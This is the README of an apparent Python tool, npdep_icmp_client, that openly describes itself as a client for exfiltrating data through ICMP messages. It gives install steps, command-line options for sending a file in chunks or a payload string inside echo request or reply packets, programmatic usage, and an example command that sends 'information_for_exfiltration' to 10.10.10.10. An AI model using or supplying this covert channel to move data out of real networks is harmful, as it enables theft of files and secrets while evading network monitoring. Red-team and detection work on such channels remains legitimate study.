# Description

A client to exfiltrate data through ICMP messages

# Installation

`pip install npdep_icmp_client`

# Usage

**From command line:**

`python -m npdep_icmp_client [-h] [--mode {payload,file}] --ip IP [--port PORT] --msg {echo_req,echo_rep} [--pkgSize PKGSIZE] [--filePath FILEPATH] [--payload PAYLOAD]`

| Option | Short | Type | Default | Description |
|---|---|---|---|---|
|--mode | -o | String | file | file = Sends file `--filePath` in `--pkSize` chunks per ICMP message <br> payload = Sends `payload` per ICMP message |
|--msg | -m | String | - | echo_req = Echo Request Message <br> echo_rep = Echo Reply Message |
|--ip | -i | String | - | IP address of destination |
|--port | -p | Int | 0 | Port of destination |
|--pkgSize | -k | Int | 1200 | Nr. of bytes to load from file under `--filePath` in chunks |
|--filePath | -e | String | - | Path to file which shall be send in mode: file |
|--payload | -a | String | - | Payload to be send in mode: payload |

**Programmatically:**

```py
from npdep_icmp_client.client.Client import Client as ICMPClient
from npdep_icmp_client.type.IcmpType import IcmpType as ICMPType

client = ICMPClient("10.10.10.10", 4567)
client.sendEchoMessage(ICMPType.ECHO_REQUEST, "information_for_exfiltration")
```


# Example

`python -m npdep_icmp_client -o payload -m echo_req -i 10.10.10.10 -a "information_for_exfiltration"`

Sends `information_for_exfiltration` to `10.10.10.10` as an ICMP `Echo` request.
